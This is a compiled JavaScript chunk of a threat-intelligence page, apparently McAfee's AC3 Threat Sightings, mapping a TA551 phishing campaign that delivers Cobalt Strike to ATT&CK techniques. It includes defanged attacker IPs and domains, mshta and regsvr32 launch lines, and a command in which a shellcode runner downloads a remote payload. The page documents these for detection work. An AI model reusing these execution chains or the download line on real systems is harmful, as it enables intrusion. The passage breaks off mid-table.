"use strict";(self.webpackChunkac3_threat_sightings=self.webpackChunkac3_threat_sightings||[]).push([[1015],{3248:function(e,t,a){var n=a(7294),r=a(7273);r.Z.initialize({startOnLoad:!0});t.Z=function(e){var t=e.chart;return(0,n.useEffect)((function(){r.Z.contentLoaded()}),[]),n.createElement("div",{className:"mermaid"},t)}},9687:function(e,t,a){a.r(t),a.d(t,{frontMatter:function(){return d},contentTitle:function(){return s},metadata:function(){return m},toc:function(){return p},default:function(){return c}});var n=a(7462),r=a(3366),l=(a(7294),a(4137)),i=a(3248),o=["components"],d={},s=void 0,m={unversionedId:"Sightings/TA551-Phishing",id:"Sightings/TA551-Phishing",isDocsHomePage:!1,title:"TA551-Phishing",description:"Overview",source:"@site/docs/03-Sightings/10-TA551-Phishing.md",sourceDirName:"03-Sightings",slug:"/Sightings/TA551-Phishing",permalink:"/ac3-threat-sightings/docs/Sightings/TA551-Phishing",tags:[],version:"current",sidebarPosition:10,frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"UNK-Credential_Access",permalink:"/ac3-threat-sightings/docs/Sightings/UNK-Credential_Access"},next:{title:"UNK-Phishing",permalink:"/ac3-threat-sightings/docs/Sightings/UNK-Phishing"}},p=[{value:"Overview",id:"overview",children:[{value:"References:",id:"references",children:[]},{value:"Threat Actor Activity",id:"threat-actor-activity",children:[]},{value:"Count of documented TTPs by Tactic",id:"count-of-documented-ttps-by-tactic",children:[]},{value:"Attack Flow",id:"attack-flow",children:[]}]},{value:"Tactics, Techniques and Procedures",id:"tactics-techniques-and-procedures",children:[]},{value:"Tactics, Techniques, Procedures, Observables and Notes",id:"tactics-techniques-procedures-observables-and-notes",children:[]},{value:"TTP Profiles with Observables",id:"ttp-profiles-with-observables",children:[{value:"Threat actor used <em>Email</em> with <em>.zipped .doc file</em> as attachment for Initial Access.",id:"threat-actor-used-email-with-zipped-doc-file-as-attachment-for-initial-access",children:[]},{value:"Threat actor used <em>weaponized .doc files</em> to lure users for Execution.",id:"threat-actor-used-weaponized-doc-files-to-lure-users-for-execution",children:[]},{value:"Threat actor used <em>MSHTA</em> to download a malicious <em>.DLL</em> masqueraded as a <em>.JPG</em> file for Command And Control.",id:"threat-actor-used-mshta-to-download-a-malicious-dll-masqueraded-as-a-jpg-file-for-command-and-control",children:[]},{value:"Threat actor used <em>REGSVR32</em> to launch payload for Defense Evasion.",id:"threat-actor-used-regsvr32-to-launch-payload-for-defense-evasion",children:[]},{value:"Threat actor used <em>REGSVR32</em> to download a masqueraded <em>Cobalt Strike shellcode runner</em> for Command And Control.",id:"threat-actor-used-regsvr32-to-download-a-masqueraded-cobalt-strike-shellcode-runner-for-command-and-control",children:[]},{value:"Threat actor used <em>Cobalt Strike shellcode runner</em> to execute a remote payload for Command And Control.",id:"threat-actor-used-cobalt-strike-shellcode-runner-to-execute-a-remote-payload-for-command-and-control",children:[]}]}],u={toc:p};function c(e){var t=e.components,a=(0,r.Z)(e,o);return(0,l.kt)("wrapper",(0,n.Z)({},u,a,{components:t,mdxType:"MDXLayout"}),(0,l.kt)("h2",{id:"overview"},"Overview"),(0,l.kt)("p",null,"This Threat Sightings documents TPPs of a TA551 campaign distributing Cobalt Strike."),(0,l.kt)("p",null,"This document is a summary of the extracted TTPs. For full details please refer to the AC3 Threat Sighting (.yml file) at: ",(0,l.kt)("a",{parentName:"p",href:"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_TA551.yml"},"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_TA551.yml")),(0,l.kt)("p",null,"Author: Jose Luis Sanchez Martinez (@Joseliyo_Jstnk)"),(0,l.kt)("p",null,"Acknowledgements: Brad (@malware_traffic)"),(0,l.kt)("h3",{id:"references"},"References:"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("a",{parentName:"li",href:"https://www.malware-traffic-analysis.net/2021/07/21/index.html"},"https://www.malware-traffic-analysis.net/2021/07/21/index.html")),(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("a",{parentName:"li",href:"https://app.any.run/tasks/76a02b7a-9aea-415d-81d3-f1d4c4b89939/"},"https://app.any.run/tasks/76a02b7a-9aea-415d-81d3-f1d4c4b89939/")),(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("a",{parentName:"li",href:"https://unit42.paloaltonetworks.com/valak-evolution/"},"https://unit42.paloaltonetworks.com/valak-evolution/")," (Jul 2020)"),(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("a",{parentName:"li",href:"https://blog.talosintelligence.com/2020/07/valak-emerges.html"},"https://blog.talosintelligence.com/2020/07/valak-emerges.html")," (Jul 2020)"),(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("a",{parentName:"li",href:"https://assets.sentinelone.com/labs/sentinel-one-valak-i(Jun"},"https://assets.sentinelone.com/labs/sentinel-one-valak-i(Jun")," 2020)"),(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("a",{parentName:"li",href:"https://labs.sentinelone.com/valak-malware-and-the-connection-to-gozi-loader-confcrew/"},"https://labs.sentinelone.com/valak-malware-and-the-connection-to-gozi-loader-confcrew/")," (Jun 2020)"),(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("a",{parentName:"li",href:"https://www.cybereason.com/blog/valak-more-than-meets-the-eye"},"https://www.cybereason.com/blog/valak-more-than-meets-the-eye")," (May 2020)"),(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("a",{parentName:"li",href:"https://securityintelligence.com/posts/breaking-the-ice-a-deep-dive-into-the-icedid-banking-trojans-new-major-version-release/"},"https://securityintelligence.com/posts/breaking-the-ice-a-deep-dive-into-the-icedid-banking-trojans-new-major-version-release/")," (Apr 2020)"),(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("a",{parentName:"li",href:"https://blog.malwarebytes.com/threat-analysis/2019/12/new-version-of-icedid-trojan-uses-steganographic-payloads/"},"https://blog.malwarebytes.com/threat-analysis/2019/12/new-version-of-icedid-trojan-uses-steganographic-payloads/")," (Jan 2020)"),(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("a",{parentName:"li",href:"https://www.sentinelone.com/blog/ursnif-polymorphic-delivery-mechanism-explained/"},"https://www.sentinelone.com/blog/ursnif-polymorphic-delivery-mechanism-explained/")," (Apr 2019)"),(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("a",{parentName:"li",href:"https://www.carbonblack.com/blog/carbon-black-tau-threatsight-analysis-gandcrab-and-ursnif-campaign/"},"https://www.carbonblack.com/blog/carbon-black-tau-threatsight-analysis-gandcrab-and-ursnif-campaign/")," (Jan 2019)"),(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("a",{parentName:"li",href:"https://www.secureworks.com/research/threat-profiles/gold-cabin"},"https://www.secureworks.com/research/threat-profiles/gold-cabin")),(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("a",{parentName:"li",href:"https://malware.dontneedcoffee.com/refs/actors/ta551/"},"https://malware.dontneedcoffee.com/refs/actors/ta551/"))),(0,l.kt)("h3",{id:"threat-actor-activity"},"Threat Actor Activity"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Threat actor used ",(0,l.kt)("em",{parentName:"li"},"Email")," with ",(0,l.kt)("em",{parentName:"li"},".zipped .doc file")," as attachment for Initial Access."),(0,l.kt)("li",{parentName:"ul"},"Threat actor used ",(0,l.kt)("em",{parentName:"li"},"weaponized .doc files")," to lure users for Execution."),(0,l.kt)("li",{parentName:"ul"},"Threat actor used ",(0,l.kt)("em",{parentName:"li"},"MSHTA")," to download a malicious ",(0,l.kt)("em",{parentName:"li"},".DLL")," masqueraded as a ",(0,l.kt)("em",{parentName:"li"},".JPG")," file for Command And Control."),(0,l.kt)("li",{parentName:"ul"},"Threat actor used ",(0,l.kt)("em",{parentName:"li"},"REGSVR32")," to launch payload for Defense Evasion."),(0,l.kt)("li",{parentName:"ul"},"Threat actor used ",(0,l.kt)("em",{parentName:"li"},"REGSVR32")," to download a masqueraded ",(0,l.kt)("em",{parentName:"li"},"Cobalt Strike shellcode runner")," for Command And Control."),(0,l.kt)("li",{parentName:"ul"},"Threat actor used ",(0,l.kt)("em",{parentName:"li"},"Cobalt Strike shellcode runner")," to execute a remote payload for Command And Control.")),(0,l.kt)("h3",{id:"count-of-documented-ttps-by-tactic"},"Count of documented TTPs by Tactic"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,l.kt)("th",{parentName:"tr",align:null},"# Documented TTPs"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Initial Access"),(0,l.kt)("td",{parentName:"tr",align:null},"+ (1)")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Execution"),(0,l.kt)("td",{parentName:"tr",align:null},"+ (1)")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,l.kt)("td",{parentName:"tr",align:null},"+ (1)")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,l.kt)("td",{parentName:"tr",align:null},"+++ (3)")))),(0,l.kt)("h3",{id:"attack-flow"},"Attack Flow"),(0,l.kt)("p",null,"The chart below shows a graphical representation of the attack flow."),(0,l.kt)(i.Z,{chart:"\ngraph LR\nIA[Initial Access] --\x3e | _Email_ with _.zipped .doc file_ as attachment| IA[Initial Access]\nIA[Initial Access] --\x3e | _weaponized .doc files_ to lure users| EXE[Execution]\nEXE[Execution] --\x3e | _MSHTA_ to download a malicious _.DLL_ masqueraded as a _.JPG_ file| C2[Command And Control]\nEXE[Execution] --\x3e | _REGSVR32_ to launch payload| DE[Defense Evasion]\nDE[Defense Evasion] --\x3e | _REGSVR32_ to download a masqueraded _Cobalt Strike shellcode runner_| C2[Command And Control]\nDE[Defense Evasion] --\x3e | _Cobalt Strike shellcode runner_ to execute a remote payload| C2[Command And Control]\n",mdxType:"Mermaid"}),(0,l.kt)("h2",{id:"tactics-techniques-and-procedures"},"Tactics, Techniques and Procedures"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,l.kt)("th",{parentName:"tr",align:null},"Techniques"),(0,l.kt)("th",{parentName:"tr",align:null},"Procedure"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Initial Access"),(0,l.kt)("td",{parentName:"tr",align:null},"T1566.001 - Phishing: Spearphishing Attachment",(0,l.kt)("br",null),"T1204.002 - User Execution: Malicious File"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"Email")," with ",(0,l.kt)("em",{parentName:"td"},".zipped .doc file")," as attachment for Initial Access.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Execution"),(0,l.kt)("td",{parentName:"tr",align:null},"T1204.002 - User Execution: Malicious File",(0,l.kt)("br",null),"T1059.003 - Command and Scripting Interpreter: Windows Command Shell",(0,l.kt)("br",null),"T1218.005 - Signed Binary Proxy Execution: Mshta"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"weaponized .doc files")," to lure users for Execution.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,l.kt)("td",{parentName:"tr",align:null},"T1071.001 - Web Protocols",(0,l.kt)("br",null),"T1105 - Ingress Tool Transfer"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"MSHTA")," to download a malicious ",(0,l.kt)("em",{parentName:"td"},".DLL")," masqueraded as a ",(0,l.kt)("em",{parentName:"td"},".JPG")," file for Command And Control.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,l.kt)("td",{parentName:"tr",align:null},"T1218.010 - Signed Binary Proxy Execution: Regsvr32",(0,l.kt)("br",null),"T1036 - Masquerading",(0,l.kt)("br",null),"T1218.005 - Signed Binary Proxy Execution: Mshta",(0,l.kt)("br",null),"T1105 - Ingress Tool Transfer"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"REGSVR32")," to launch payload for Defense Evasion.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,l.kt)("td",{parentName:"tr",align:null},"T1218.010 - Signed Binary Proxy Execution: Regsvr32",(0,l.kt)("br",null),"T1105 - Ingress Tool Transfer"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"REGSVR32")," to download a masqueraded ",(0,l.kt)("em",{parentName:"td"},"Cobalt Strike shellcode runner")," for Command And Control.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,l.kt)("td",{parentName:"tr",align:null},"T1071.001 - Application Layer Protocol: Web Protocols",(0,l.kt)("br",null),"T1105 - Ingress Tool Transfer"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"Cobalt Strike shellcode runner")," to execute a remote payload for Command And Control.")))),(0,l.kt)("h2",{id:"tactics-techniques-procedures-observables-and-notes"},"Tactics, Techniques, Procedures, Observables and Notes"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,l.kt)("th",{parentName:"tr",align:null},"Techniques"),(0,l.kt)("th",{parentName:"tr",align:null},"Procedure"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"),(0,l.kt)("th",{parentName:"tr",align:null},"Notes"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Initial Access"),(0,l.kt)("td",{parentName:"tr",align:null},"T1566.001",(0,l.kt)("br",null),"T1204.002"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"Email")," with ",(0,l.kt)("em",{parentName:"td"},".zipped .doc file")," as attachment for Initial Access."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Attachment"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"request.zip"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\specifics 07.21.doc")),(0,l.kt)("td",{parentName:"tr",align:null},"- Uses existing e-mail thread within compromised e-mail account (Reply Chain Attack).")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Execution"),(0,l.kt)("td",{parentName:"tr",align:null},"T1204.002",(0,l.kt)("br",null),"T1059.003",(0,l.kt)("br",null),"T1218.005"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"weaponized .doc files")," to lure users for Execution."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'"C:\\\\Program Files\\\\Microsoft Office\\\\Office14\\\\WINWORD.EXE" /n "C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\specifics 07.21.doc"'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'"C:\\\\Program Files\\\\Microsoft Office\\\\Office16\\\\WINWORD.EXE" /n "C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\Rar$DIb46044.38871\\\\adjure 07.21.2021.doc" /o ""'),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"c:\\\\programdata\\\\brDefine.hta"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\ProgramData\\\\sds.hta"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"cmd /c c:\\\\programdata\\\\brDefine.hta"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"cmd /c c:\\\\programdata\\\\sds.hta"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'"C:\\\\Windows\\\\System32\\\\mshta.exe" "C:\\\\programdata\\\\brDefine.hta"'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'"C:\\\\Windows\\\\SysWOW64\\\\mshta.exe" "C:\\\\programdata\\\\sds.hta" {1E460BD7-F1C3-4B2E-88BF-4E770A288AF5}{1E460BD7-F1C3-4B2E-88BF-4E770A288AF5}')),(0,l.kt)("td",{parentName:"tr",align:null},"- during the execution of WINWORD, files were dropped.",(0,l.kt)("br",null),"- two instances of the TTP are provided",(0,l.kt)("br",null),"- mshta is responsible for the execution of the hta file")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,l.kt)("td",{parentName:"tr",align:null},"T1071.001",(0,l.kt)("br",null),"T1105"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"MSHTA")," to download a malicious ",(0,l.kt)("em",{parentName:"td"},".DLL")," masqueraded as a ",(0,l.kt)("em",{parentName:"td"},".JPG")," file for Command And Control."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"45[.]144.29.211"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"wilkinstransportss[.]com"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"80[.]92.206.122"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"steptransport2017b[.]com"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"c:\\\\users\\\\public\\\\brDefine.jpg"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"c:\\\\users\\\\public\\\\uGirl.jpg")),(0,l.kt)("td",{parentName:"tr",align:null},"- those jpg files are DLL.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,l.kt)("td",{parentName:"tr",align:null},"T1218.010",(0,l.kt)("br",null),"T1036",(0,l.kt)("br",null),"T1218.005",(0,l.kt)("br",null),"T1105"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"REGSVR32")," to launch payload for Defense Evasion."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'"C:\\\\Windows\\\\System32\\\\regsvr32.exe" c:\\\\users\\\\public\\\\brDefine.jpg'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'"C:\\\\Windows\\\\System32\\\\regsvr32.exe" c:\\\\users\\\\public\\\\uGirl.jpg')),(0,l.kt)("td",{parentName:"tr",align:null},"- JPG files are actually DLL files.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,l.kt)("td",{parentName:"tr",align:null},"T1218.010",(0,l.kt)("br",null),"T1105"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"REGSVR32")," to download a masqueraded ",(0,l.kt)("em",{parentName:"td"},"Cobalt Strike shellcode runner")," for Command And Control."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\jyheeckptwa.exe")),(0,l.kt)("td",{parentName:"tr",align:null})),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,l.kt)("td",{parentName:"tr",align:null},"T1071.001",(0,l.kt)("br",null),"T1105"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"Cobalt Strike shellcode runner")," to execute a remote payload for Command And Control."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"89.163.140[.]101"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"jyheeckptwa.exe -u http://89[.]163.140.101:8000/download/abc.bin -t 1")),(0,l.kt)("td",{parentName:"tr",align:null},"- This shell code runner seems a variation or developed upon ",(0,l.kt)("em",{parentName:"td"},"Gopurple.exe"),(0,l.kt)("br",null),"- the payload is likely a CobaltStrike payload.")))),(0,l.kt)("h2",{id:"ttp-profiles-with-observables"},"TTP Profiles with Observables"),(0,l.kt)("h3",{id:"threat-actor-used-email-with-zipped-doc-file-as-attachment-for-initial-access"},"Threat actor used ",(0,l.kt)("em",{parentName:"h3"},"Email")," with ",(0,l.kt)("em",{parentName:"h3"},".zipped .doc file")," as attachment for Initial Access."),(0,l.kt)("h4",{id:"tactic"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Initial Access")),(0,l.kt)("h4",{id:"techniques"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1566.001 - Phishing: Spearphishing Attachment"),(0,l.kt)("li",{parentName:"ul"},"T1204.002 - User Execution: Malicious File")),(0,l.kt)("h4",{id:"behaviors-and-observables"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1566.001"),(0,l.kt)("td",{parentName:"tr",align:null},"Email with ",(0,l.kt)("em",{parentName:"td"},".zipped .doc file")," as attachment."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Attachment"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"request.zip"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1204.002"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},".doc")," file created."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\specifics 07.21.doc"))))),(0,l.kt)("h3",{id:"threat-actor-used-weaponized-doc-files-to-lure-users-for-execution"},"Threat actor used ",(0,l.kt)("em",{parentName:"h3"},"weaponized .doc files")," to lure users for Execution."),(0,l.kt)("h4",{id:"tactic-1"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Execution")),(0,l.kt)("h4",{id:"techniques-1"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1204.002 - User Execution: Malicious File"),(0,l.kt)("li",{parentName:"ul"},"T1059.003 - Command and Scripting Interpreter: Windows Command Shell"),(0,l.kt)("li",{parentName:"ul"},"T1218.005 - Signed Binary Proxy Execution: Mshta")),(0,l.kt)("h4",{id:"behaviors-and-observables-1"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1204.002"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Winword")," opened ",(0,l.kt)("em",{parentName:"td"},".doc")," file from Temp folder."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'"C:\\\\Program Files\\\\Microsoft Office\\\\Office14\\\\WINWORD.EXE" /n "C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\specifics 07.21.doc"'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'"C:\\\\Program Files\\\\Microsoft Office\\\\Office16\\\\WINWORD.EXE" /n "C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\Rar$DIb46044.38871\\\\adjure 07.21.2021.doc" /o ""'))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null}),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Winword")," created ",(0,l.kt)("em",{parentName:"td"},".HTA")," file at ProgramData folder."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"c:\\\\programdata\\\\brDefine.hta"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\ProgramData\\\\sds.hta"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1059.003"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Winword")," spawned ",(0,l.kt)("em",{parentName:"td"},"CMD")," to launch ",(0,l.kt)("em",{parentName:"td"},".HTA")," file"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"cmd /c c:\\\\programdata\\\\brDefine.hta"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"cmd /c c:\\\\programdata\\\\sds.hta"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1218.005"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"CMD")," spawned ",(0,l.kt)("em",{parentName:"td"},"MSHTA"),"."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'"C:\\\\Windows\\\\System32\\\\mshta.exe" "C:\\\\programdata\\\\brDefine.hta"'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'"C:\\\\Windows\\\\SysWOW64\\\\mshta.exe" "C:\\\\programdata\\\\sds.hta" {1E460BD7-F1C3-4B2E-88BF-4E770A288AF5}{1E460BD7-F1C3-4B2E-88BF-4E770A288AF5}'))))),(0,l.kt)("h4",{id:"notes"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"mshta is responsible for the execution of the hta file")),(0,l.kt)("h3",{id:"threat-actor-used-mshta-to-download-a-malicious-dll-masqueraded-as-a-jpg-file-for-command-and-control"},"Threat actor used ",(0,l.kt)("em",{parentName:"h3"},"MSHTA")," to download a malicious ",(0,l.kt)("em",{parentName:"h3"},".DLL")," masqueraded as a ",(0,l.kt)("em",{parentName:"h3"},".JPG")," file for Command And Control."),(0,l.kt)("h4",{id:"tactic-2"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Command And Control")),(0,l.kt)("h4",{id:"techniques-2"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1071.001 - Web Protocols"),(0,l.kt)("li",{parentName:"ul"},"T1105 - Ingress Tool Transfer")),(0,l.kt)("h4",{id:"behaviors-and-observables-2"},"Behaviors and 